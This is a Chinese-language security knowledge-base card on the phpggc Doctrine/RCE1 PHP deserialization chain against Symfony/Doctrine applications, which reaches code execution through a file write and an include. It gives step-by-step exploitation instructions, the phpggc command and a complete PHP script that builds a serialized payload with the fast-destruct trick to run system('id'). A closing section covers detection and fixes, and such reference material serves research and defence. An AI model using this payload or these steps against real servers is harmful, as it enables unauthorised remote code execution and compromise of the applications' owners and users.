---
id: web-php-deserialization-doctrine-rce1-cacheadapter-filewrite-phparrayadapter-include
title: phpggc Doctrine/RCE1：doctrine/doctrine-bundle 的 CacheAdapter→MockFileSessionStorage 任意文件写入 + PhpArrayAdapter include 执行
type: scenario
domain: web
path: web/php/deserialization
technique: doctrine-rce1-cacheadapter-mockfilesessionstorage-phparrayadapter-include
aliases:
- Doctrine RCE1
- phpggc Doctrine/rce1
- Doctrine\Common\Cache\Psr6\CacheAdapter
- MockFileSessionStorage 任意文件写入
- PhpArrayAdapter include
- Symfony POP 链
- mocksess 文件写入
tags:
- php
- deserialization
- pop-chain
- symfony
- doctrine
- phpggc
- file-write
- file-include
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: doctrine/doctrine-bundle >= 1.5.1（原文：自 1.5.1 起所有版本受影响；实测 1.6.x–2.11.x 可用，v1.0.0 KO）
verification:
  verified_by: verifier-V670
  verified_at: '2026-11-13T10:16:35+08:00'
  notes: 已对照原文与 img01-06、img07 首帧核对 CacheAdapter::commit、MockFileSessionStorage::save、PhpArrayAdapter::initialize include、fast destruct 与 phpggc Doctrine/rce1 命令；affected_versions 按原文『自 1.5.1 起所有版本受影响』保留。未复现（未验证点：文章 phpggc 输出含 ProxyAdapter 包装，手工链为直连 PhpArrayAdapter，两者均与原文一致）。
---

## 一句话结论

当 Symfony 应用把可控数据交给 `unserialize()` 且安装了 `doctrine/doctrine-bundle`（含 doctrine/cache 的 Psr6 类与 symfony/http-foundation、symfony/cache）时，phpggc 的 `Doctrine/RCE1` 链可从反序列化直达 RCE：`CacheAdapter::__destruct()` → `commit()` 遍历 `deferredItems`，按 item 的 expiry 走 `cache->save()`（借 `MockFileSessionStorage::save` 把 `data` 序列化写入 `<savePath>/<id>.mocksess`，其中 `<?php ... ?>` 在文件被 include 时执行）或走 `cache->delete()`（借 `PhpArrayAdapter::deleteItem → initialize()` 对可控 `file` 属性执行 `include`）；同一 payload 内用两个 CacheAdapter 分别做"写文件"和"包含文件"，配合 fast destruct 强制两个 `__destruct` 都触发，即可执行任意 PHP 代码。

## 原理

- **入口**：`Doctrine\Common\Cache\Psr6\CacheAdapter` 实现 `CacheItemPoolInterface`，`__destruct()` 直接调用 `commit()`。`commit()` 逻辑（文章 img01/02）：若 `deferredItems` 为空直接返回 true；否则遍历 `deferredItems`，对每个 item 计算 `$lifetime = ($item->getExpiry() ?? $now) - $now`：
  - `$lifetime < 0`（expiry 已过期）→ 收集到 `$expiredKeys`，随后 `$this->cache->delete($key)`；
  - 否则计入 `$itemsCount`；当只有 1 个 item 时 `return $this->cache->save($key, $item->get(), (int)$lifetime);`。
  因此在反序列化对象里设置 `deferredItems = [TypedCacheItem]`（PHP 8）或 `[CacheItem]`（PHP 7），并把 `cache` 属性指向攻击者挑选的任意对象，就能让 `__destruct` 在反序列化完成时调用该对象的 `save()`/`delete()`。
- **任意文件写入**：把 `cache` 设为 `Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage`（img03）。其 `save()`：
  1. `if (!$this->started) throw ...` → 反序列化时把 `started` 设为 `true` 绕过；
  2. 取 `$data = $this->data`，用 `$this->metadataBag->getStorageKey()` 删除对应键（`MetadataBag` 需定义 `storageKey`，如 `"a"`）；
  3. `$path = $this->getFilePath()`，即 `savePath . '/' . id . '.mocksess'`；`file_put_contents($tmp, serialize($data)); rename($tmp, $path);`。
  写入的内容是 `serialize($data)`——攻击者的 PHP 代码作为数组元素的原样字符串被写进文件，`<?php system(...); ?>` 这类标记在文件被 PHP 解析/include 时仍会执行（`s:<长度>:"<代码>"` 的长度只需与代码一致），文章实测生成 `/tmp/aaa.mocksess` 并直接 `php` 执行成功。
- **任意文件包含**：把 `cache` 设为 `Symfony\Component\Cache\Adapter\PhpArrayAdapter`（img04）。`CacheAdapter` 走 delete 分支调用 `delete($key)` → `PhpArrayAdapter::deleteItem()`；当 `values` 未初始化时进入 `initialize()`，其中 `$values = self::$valuesCache[$this->file] = (include $this->file) ?: [[], []];`——`file` 属性完全可控，指向刚写入的 `.mocksess` 文件即执行其中 PHP 代码。
- **两条链如何协同**：一个 CacheAdapter 只能指定一个 `cache`，所以 payload 用两个 CacheAdapter 对象——一个指向 MockFileSessionStorage（写），一个指向 PhpArrayAdapter（包含）。两者都依赖 `__destruct`，普通数组在脚本结束时的析构顺序/异常可能让第二条链不执行，文章用 **fast destruct**：把序列化数组中的第二个索引改写为与第一个对象相同（如 `i:1001;` 改成 `i:1000;`、`i:2001;` 改成 `i:2000;`），反序列化时后值覆盖前值使对象引用计数归零，两个 `__destruct` 在反序列化过程中立即执行（原理见关联卡）。
- **PHP 版本差异**：`TypedCacheItem` 使用 PHP 8 的类型化属性，PHP 7 下会 `Parse error`；PHP 7 应使用同命名空间的 `CacheItem`。phpggc 的兼容性脚本测试显示 `doctrine/doctrine-bundle` 1.6.x–2.11.x 均可触发 `Doctrine/RCE1`，v1.0.0 不可用；原文称自 1.5.1 起所有版本受影响。
- **为什么成立**：`CacheAdapter` 把"缓存提交"委托给 `cache` 属性上的任意对象，`MockFileSessionStorage` 的 `save()` 对路径/内容不设限、`PhpArrayAdapter` 的 `initialize()` 直接 `include` 可控 `file`；三者组合在反序列化对象图完全可控时形成"写文件 + 包含文件"的完整原语，不依赖任何 CVE，只依赖应用把用户输入传给 `unserialize()`。

## 触发条件

- 应用存在 `unserialize()` 且输入可控（文章示例：`unserialize(base64_decode($_GET['data']))`）。
- 目标安装 `doctrine/doctrine-bundle`（Symfony + Doctrine ORM 项目通常会装，doctrine/cache、symfony/http-foundation、symfony/cache 类可 autoload）。
- 组件版本满足 `doctrine/doctrine-bundle >= 1.5.1`（原文标记）。
- 写入路径 `savePath` 对 Web 进程可写；包含时进程能读到该文件（同一路径/权限）。
- PHP 版本与 gadget 匹配：PHP 8 用 `TypedCacheItem`，PHP 7 用 `CacheItem`。

## 利用步骤

1. 确认目标为 Symfony/Doctrine 应用且存在可控 `unserialize()` 入口（如调试控制器、API 参数经 base64 传入）。
2. 生成 payload：`phpggc Doctrine/rce1 'system("id");'`（或按文章 serialize.php 手工构造两个 CacheAdapter + fast destruct 改写），得到序列化串。
3. base64 编码后提交到入口（文章示例 `GET /unserialize?data=<base64>`）。
4. 反序列化时：写链把 `serialize(['<?php system("id"); ?>'])` 写入 `<savePath>/<id>.mocksess`；包含链 `PhpArrayAdapter::initialize()` 立即 `include` 该文件，PHP 代码在 Web 进程权限下执行。
5. 验证回显/结果（文章在 PHP 8.1.22 + Symfony 6.3.3 演示成功，输出 `I was TRIGGERED` 与 `id`）。

## PoC

```bash
# phpggc 生成（文章给出的等价命令）
$ phpggc Doctrine/rce1 'system("id");'
```

```php
<?php
// 文章全链脚本的最小骨架：写文件链 + 包含链 + fast destruct 索引改写
namespace Doctrine\Common\Cache\Psr6 {
    class CacheAdapter { public $deferredItems = true; }
    class CacheItem { public $expiry = 99999999999999999; public $value = "test"; }
    class TypedCacheItem { public $expiry = 99999999999999999; public $value = "test"; }
}
namespace Symfony\Component\HttpFoundation\Session\Storage {
    class MockFileSessionStorage {
        public $started = true;
        public $savePath = "/tmp";                 // 生成 /tmp/aaa.mocksess
        public $id = "aaa";
        public $data = ['<?php system("id"); ?>']; // 写入的 PHP 代码
    }
    class MetadataBag { public $storageKey = "a"; }
}
namespace Symfony\Component\Cache\Adapter {
    class PhpArrayAdapter { public $file = "/tmp/aaa.mocksess"; }
}
namespace PopChain {
    use Doctrine\Common\Cache\Psr6\CacheAdapter;
    use Doctrine\Common\Cache\Psr6\TypedCacheItem;
    use Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage;
    use Symfony\Component\HttpFoundation\Session\Storage\MetadataBag;
    use Symfony\Component\Cache\Adapter\PhpArrayAdapter;

    $w = new CacheAdapter();                       // 写文件链
    $w->deferredItems = [new TypedCacheItem()];
    $ms = new MockFileSessionStorage();
    $ms->metadataBag = new MetadataBag();
    $w->cache = $ms;

    $i = new CacheAdapter();                       // 包含文件链
    $i->cache = new PhpArrayAdapter();
    $item2 = new TypedCacheItem(); $item2->expiry = 0; // 走 delete 分支
    $i->deferredItems = [$item2];

    $s = serialize([1000 => $w, 1001 => 1, 2000 => $i, 2001 => 1]);
    // fast destruct：制造重复索引，让两个对象在反序列化中立即析构
    $s = preg_replace('#i:1001;#', 'i:1000;', $s);
    echo preg_replace('#i:2001;#', 'i:2000;', $s);
}
```

## 变体与关联

- 变体：只有文件写入原语时，可配合目标已有的 LFI/包含点执行；只有 includable 文件（日志、session、上传）时，可单独用 PhpArrayAdapter 链。
- 变体：PHP 7 用 `CacheItem` 替换 `TypedCacheItem`（phpggc 已做版本适配）；`expiry` 取 0/1 走 delete 分支、取超大值走 save 分支。
- 关联：[[web-php-deserialization-premature-destruct-bypass]]（fast destruct/重复键提前析构的通用原理）、[[web-php-deserialization-guzzle-fnstream-destruct-callable-gadget]]、[[web-php-deserialization-pop-filelogger-webshell]]（其他 PHP 文件写/包含链）、[[web-php-deserialization-phar-read-uploaded-image-pop-chain]]。
- 边界：目标缺少 doctrine-bundle 或相关 Symfony 类无法 autoload 时链不可用；应用使用 `allowed_classes` 白名单、改用 JSON 或不存在 `unserialize` 用户输入入口时无效。

## 检测与防御

- 检测：请求参数/请求体中出现 Base64 序列化串，解码后包含 `Doctrine\Common\Cache\Psr6\CacheAdapter`、`MockFileSessionStorage`、`PhpArrayAdapter`、`MetadataBag` 等类名；Web 目录/临时目录出现 `*.mocksess` 文件；PHP 进程访问 `savePath` 后又 `include` 同一文件；`CacheAdapter::commit`/`MockFileSessionStorage::save`/`PhpArrayAdapter::initialize` 在异常栈中出现。
- 修复：不要对用户输入调用 `unserialize`；必须用时设置 `allowed_classes` 白名单（只允许业务类），或改用 `json_decode`；清理不需要的调试/反序列化接口。
- 加固：限制 Web 进程对临时目录/上传目录的写权限，禁止 include 可写目录中的文件；升级 doctrine/doctrine-bundle 与 Symfony 组件（gadget 存在不等于漏洞，根因仍是 unserialize 入口）；WAF 检测序列化类名与 `*.mocksess` 写入特征。
